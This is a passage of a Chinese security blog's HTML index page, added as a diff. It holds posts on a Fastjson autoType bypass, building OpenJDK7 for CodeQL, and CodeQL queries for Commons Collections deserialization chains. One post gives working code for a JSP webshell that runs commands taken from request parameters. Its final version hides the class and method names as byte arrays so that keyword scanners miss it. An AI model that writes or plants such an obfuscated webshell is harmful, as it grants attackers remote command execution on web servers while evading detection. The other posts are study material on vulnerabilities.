+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614190503311.png" alt="image-20220614190503311"></p>
+<p>在这个方法中,获取到了val对应的值<code>com.sun.rowset.JdbcRowSetImpl</code></p>
+<p>并且在这个if中进行了类加载</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614191433526.png" alt="image-20220614191433526"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614192231949.png" alt="image-20220614192231949"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614192924962.png" alt="image-20220614192924962"></p>
+<p>这里的第三个参数<code>cache</code>为<code>true</code>很重要,这样加载完的类就会存储到之前的<code>mapping</code>中,此时<code>com.sun.rowset.JdbcRowSetImpl</code>就存储在了<code>getClassFromMapping</code>这个方法对应的<code>mapping</code>中</p>
+<p>接下来继续解析字符串,检测到左侧大括号,调用<code>paseObject</code>,实际上还是调用的<code>DefaultJSONParser#parseObject</code></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614193252144.png" alt="image-20220614193252144"></p>
+<p>继续到<code>checkAutoType</code>的时候,就可以直接从这里获取到<code>com.sun.rowset.JdbcRowSetImpl</code>类了</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614193532234.png" alt="image-20220614193532234"></p>
+<p>走的这个if还不需要开启<code>AutoType</code>从而绕过了checkAutoType</p>
+<h3 id="lt-1-2-68"><a href="#lt-1-2-68" class="headerlink" title="&lt;=1.2.68"></a>&lt;=1.2.68</h3><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/" class="post-title-link" itemprop="url">jsp无关键字一句话</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-16 20:23:20 / 修改时间：23:36:18" itemprop="dateCreated datePublished" datetime="2022-05-16T20:23:20+08:00">2022-05-16</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>通过ascii码与字符之间的转换,加上通过反射加载类,实现无关键字一句话</p>
+<h4 id="py脚本script-str2ascii"><a href="#py脚本script-str2ascii" class="headerlink" title="py脚本script_str2ascii"></a>py脚本<code>script_str2ascii</code></h4><p>首先写一个简单的py脚本,转换命令为byte数组</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">input</span>(<span class="string">&quot;input code&quot;</span>)</span><br><span class="line">arr=[]</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">    arr.append(<span class="built_in">ord</span>(char))</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure>
+
+<h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>接下来找一个简单的小马,进行改造</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="comment">//加一个系统的判断</span></span><br><span class="line">    String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">    <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">    BufferedReader bufferedReader;</span><br><span class="line">    <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String len;</span><br><span class="line">        <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="通过反射改变获取类并执行的方式"><a href="#通过反射改变获取类并执行的方式" class="headerlink" title="通过反射改变获取类并执行的方式"></a>通过反射改变获取类并执行的方式</h4><p>主要目的是将runtime相关的类和函数通过反射进行修改</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    Method method = aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    Method method1 = aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    method1.invoke(o,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过反射加载runtime类的方式可行,并且成功弹出了计算器</p>
+<p>接下来通过ascii数组,替换其中比较敏感的字符串</p>
+<p>上面那个小马里面别的不关键的东西懒得写了…..</p>
+<p><strong>这里可以使用byte数组,原因是当前涉及到的字符串中的所有字符ascii码均在127以下</strong></p>
+<h4 id="加入byte数组"><a href="#加入byte数组" class="headerlink" title="加入byte数组"></a>加入byte数组</h4><p>通过byte数组修饰以下关键字</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">byte</span>[] a=&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="keyword">new</span> String(a));<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    <span class="keyword">byte</span>[] b=&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;;</span><br><span class="line">    Method method = aClass.getMethod(<span class="keyword">new</span> String(b));</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    <span class="keyword">byte</span>[] c=&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;;</span><br><span class="line">    Method method1 = aClass.getMethod(<span class="keyword">new</span> String(c), String.class);</span><br><span class="line">    method1.invoke(o,request.getParameter(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>比较基础的东西,别笑话我呜呜呜呜</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-title-link" itemprop="url">centos编译openjdk7成功---但是创建codeql数据库失败的记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-16 12:15:58 / 修改时间：13:52:10" itemprop="dateCreated datePublished" datetime="2022-05-16T12:15:58+08:00">2022-05-16</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="centos编译openjdk7成功—但是创建codeql数据库失败的记录"><a href="#centos编译openjdk7成功—但是创建codeql数据库失败的记录" class="headerlink" title="centos编译openjdk7成功—但是创建codeql数据库失败的记录"></a>centos编译openjdk7成功—但是创建codeql数据库失败的记录</h2><blockquote>
+<p>实验环境</p>
+<p>centos7</p>
+<p>jdk1.6.0_45 (这点很重要,起初由于使用了jdk8作为bootjdk导致莫名其妙的报错,查询了很久才解决)</p>
+</blockquote>
+<p>本篇文章可以作为编译openjdk7的参考,但是由于不熟悉编译原理,到底为什么可以编译openjdk7却不能像openjdk8一样生成对应的codeql数据库就不知道为啥了</p>
+<p>安装所需库和工具,依次执行按y即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yum install cups-devel.x86_64</span><br><span class="line">yum install freetype.x86_64 freetype-devel.x86_64</span><br><span class="line">yum install alsa*</span><br><span class="line">yum install ant</span><br><span class="line">yum install cups-devel</span><br><span class="line">yum install glibc-static libstdc++-static</span><br><span class="line">yum install libX*</span><br><span class="line">yum install libXt-devel</span><br><span class="line">yum install libXrender-devel</span><br><span class="line">yum install libXext-devel</span><br><span class="line">yum install libXtst-devel</span><br><span class="line">yum install gcc gcc-c++</span><br><span class="line">yum install freetype-devel</span><br><span class="line">yum install libstdc++-static</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装BootJdk"><a href="#安装BootJdk" class="headerlink" title="安装BootJdk"></a>安装BootJdk</h3><p>去官网下载安装jdk1.6</p>
+<blockquote>
+<p>链接<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html">https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html</a></p>
+</blockquote>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516125517310.png" alt="image-20220516125517310"></p>
+<p>下载下来通过ssh工具传到usr/local目录下</p>
+<p><code>chmod 775 jdk-6u45-linux-x64.bin </code></p>
+<p>使用改命令修改其为可执行</p>
+<p><code>./jdk-6u45-linux-x64.bin</code></p>
+<p>会自动在当前目录解压出来一个<code>jdk1.6.0_45</code></p>
+<p>接着,修改系统变量</p>
+<p><code>vim /etc/profile</code></p>
+<p>在最下面插入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set Java enviroment</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2/lib/ant-launcher.jar</span><br><span class="line"></span><br><span class="line"><span class="comment">#set Ant enviroment</span></span><br><span class="line"></span><br><span class="line">ANT_HOME=/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$ANT_HOME</span>/bin:<span class="variable">$CLASSPATH</span>:<span class="variable">$JRE_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>然后<code>!wq</code>退出</p>
+<p><code>source /etc/profile</code>更新变量</p>
+<p><code>java-version</code></p>
+<p>显示为jdk1,6即配置成功</p>
+<h3 id="下载openjdk"><a href="#下载openjdk" class="headerlink" title="下载openjdk"></a>下载openjdk</h3><p>直接去官网下载很慢,推荐一个技巧,参考链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/wbo112/article/details/121584122">https://blog.csdn.net/wbo112/article/details/121584122</a></p>
+<p>文章中添加的是openjdk的仓库,我们在openjdk的github仓库那里搜索jdk7u按照一样的方式即可生成到码云</p>
+<p>我们需要编译的是jdk7u21,在生成好的jdk7u仓库里面通过标签找到对应版本下载即可</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516132045787.png" alt="image-20220516132045787"></p>
+<p>通过ssh上传到centos的任意位置</p>
+<p>然后通过<code>unzip</code>进行解压</p>
+<p>解压完成后进入解压出来的目录</p>
+<p>在里面创建bash脚本</p>
+<p><code>touch jdk.sh</code></p>
+<p><code>chmod jdk.sh</code></p>
+<p><code>vim jdk.sh</code></p>
+<p>往里面添加</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=C</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_BOOTDIR=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_JDK_IMPORT_PATH=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALLOW_DOWNLOADS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HOTSPOT_BUILD_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_PARALLEL_COMPILE_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_COMPARE_IMAGES=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> USE_PRECOMPILED_HEADER=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_LANGTOOLS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_JAXP=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JAXWS=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_CORBA=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_HOTSPOT=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JDK=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DISABLE_HOTSPOT_OS_VERSION_CHECK=ok</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_DEBUG_BUILD=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_FASTDEBUG_BUILD=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DEBUG_NAME=debug</span><br><span class="line"></span><br><span class="line">BUILD_DEPLOY=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">BUILD_INSTALL=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_OUTPUTDIR=/usr/<span class="built_in">local</span>/src/openjdk/build</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> JAVA_HOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> CLASSPATH</span><br><span class="line"></span><br><span class="line">make sanity</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>!wq</code>退出并保存</p>
+<p>接着<code>source ./jdk.sh</code></p>
+<p>如果输出结果为Sanity check passed表示编译检查通过(但是不代表编译一定不会出错)</p>
+<p>如果检查通过了,不要切换终端,(因为设定的变量在其他终端中无法读取)</p>
+<p>就在当前终端中输入<code>make</code>进行编译</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516124540997.png" alt="image-20220516124540997"></p>
+<p>最终在经过大概15分钟的等待之后,出现这段字符就表示编译成功了,我这里两分钟是因为已经编译过一次了</p>
+<h3 id="生成codeql数据库失败"><a href="#生成codeql数据库失败" class="headerlink" title="生成codeql数据库失败"></a>生成codeql数据库失败</h3><p>我编译jdk7u21的数据库的初衷是想使用codeql编写7u21反序列化漏洞的查询语句试试水</p>
+<p>对编译原理啥的都不咋了解,甚至连jdk为啥要编译都不知道…</p>
+<p>编译数据库的过程是参考的这篇大佬编译jdk8数据库的<a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122330521">文章</a></p>
+<p>按照本篇文章的操作,只要通过make编译jdk的准备都做好,并且make编译还成功了的话,使用这段语句便可成功编译出jdk的codeql数据库</p>
+<p><code>codeql database create openjdk7u21-db --language=&quot;java&quot; --command=&quot;make&quot; --overwrite</code></p>
+<p>但是不知道为什么在jdk7上面行不通,如果后面编译成功了的话,再来更新这篇文章</p>
+<blockquote>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37726449/article/details/81226606">https://blog.csdn.net/m0_37726449/article/details/81226606</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/" class="post-title-link" itemprop="url">codeql编写cc链查询</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-14 15:58:37 / 修改时间：16:26:57" itemprop="dateCreated datePublished" datetime="2022-05-14T15:58:37+08:00">2022-05-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>有了之前的cc3的数据库,就可以尝试编写cc的反序列化调用链了,在编写ql语句之前,首先需要明确反序列化利用链的几个基础条件</p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1511/">参考这篇文章</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">序列化利用链的条件:</span><br><span class="line">1. source，入口点，一般就是一个readObject方法</span><br><span class="line">2. sink，执行点，一般是动态方法执行、Jndi注入、写文件之类的   在本次的链中就是invokerTransformer的transform方法</span><br><span class="line">3. gadget，连接source和sink的多个类。有几个条件：</span><br><span class="line">	1). 类之间的方法调用是链式的。</span><br><span class="line">	2). 类实例之间的关系是嵌套的，调用链上后一个类实例是前一个类实例的属性。</span><br><span class="line">	3). 调用链上的类都需要是可以序列化的。</span><br></pre></td></tr></table></figure>
+
+<p>由于codeql无法在多个数据库之间查询流,并且cc的source全是jdk自带类的readObject,万恶之源还得是LazyMap和ChainedTransformer,就暂且以他两作为source,执行点呢就更简单了,就是InvokerTransformer和InstantiareTransformer</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">使用codeql的cc链分析</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-12 16:38:44 / 修改时间：16:41:09" itemprop="dateCreated datePublished" datetime="2022-05-12T16:38:44+08:00">2022-05-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/#valine-comments" itemprop="discussionUrl">
